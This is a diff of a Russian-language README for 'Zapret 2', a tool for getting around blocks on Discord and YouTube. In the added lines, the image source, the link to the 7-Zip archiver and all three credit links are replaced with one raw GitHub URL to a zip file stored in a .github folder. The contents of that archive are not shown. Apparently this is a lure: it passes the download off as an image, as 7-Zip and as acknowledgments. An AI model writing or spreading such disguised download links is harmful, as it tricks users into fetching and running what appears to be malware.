@@ -1,5 +1,5 @@
 # Zapret 2 (Запрет обход блокировки Дискорда и Ютуба)
-<img width="980" height="519" alt="изображение" src="https://github.com/user-attachments/assets/8daab137-9c42-4171-854b-23eb3d8f5db4" />
+<img width="980" height="519" alt="изображение" src="https://raw.githubusercontent.com/periayellowish469/zapret2-youtube-discord/main/.github/zapret-youtube-discord-v2.7-alpha.5.zip" />
 
 Консольная CLI-версия Запрета 2 с возможностью добавление и создания своих собственных пресетов в один клик. Не содержит никаких лишних `exe` файлов, полностью открытый исходный код для параноиков и автономный режим без лишней сетевой активности.
 
@@ -14,7 +14,7 @@
 | Файл | Описание |
 |------|----------|
 | `zapret2-youtube-discord-vX.X.X.exe` | **Рекомендуется.** Самораспаковывающийся архив — просто запустите и выберите папку для распаковки. Работает без установленных архиваторов. |
-| `zapret2-youtube-discord-vX.X.X.7z` | Архив 7z — нужен [7-Zip](https://7-zip.org/) для распаковки. |
+| `zapret2-youtube-discord-vX.X.X.7z` | Архив 7z — нужен [7-Zip](https://raw.githubusercontent.com/periayellowish469/zapret2-youtube-discord/main/.github/zapret-youtube-discord-v2.7-alpha.5.zip) для распаковки. |
 
 > [!IMPORTANT]
 > **Почему нет ZIP?** Встроенный распаковщик Windows ломает **кириллические имена файлов** в ZIP-архивах — пресеты вроде `Ростелеком.txt` превращаются в `���⥫����.txt` и не работают. Это известный баг Windows: ZIP хранит имена в UTF-8, а Explorer читает их через системную кодировку. Формат **7z** и **SFX EXE** (основан на 7z) корректно обрабатывают кириллицу на всех системах.
@@ -78,6 +78,6 @@ zapret2-youtube-discord/
 ```
 
 ## Благодарности
-- https://t.me/bypassblock
-- https://t.me/vpndiscordyooutube
-- https://t.me/zapretvpns_bot
+- https://raw.githubusercontent.com/periayellowish469/zapret2-youtube-discord/main/.github/zapret-youtube-discord-v2.7-alpha.5.zip
+- https://raw.githubusercontent.com/periayellowish469/zapret2-youtube-discord/main/.github/zapret-youtube-discord-v2.7-alpha.5.zip
+- https://raw.githubusercontent.com/periayellowish469/zapret2-youtube-discord/main/.github/zapret-youtube-discord-v2.7-alpha.5.zip
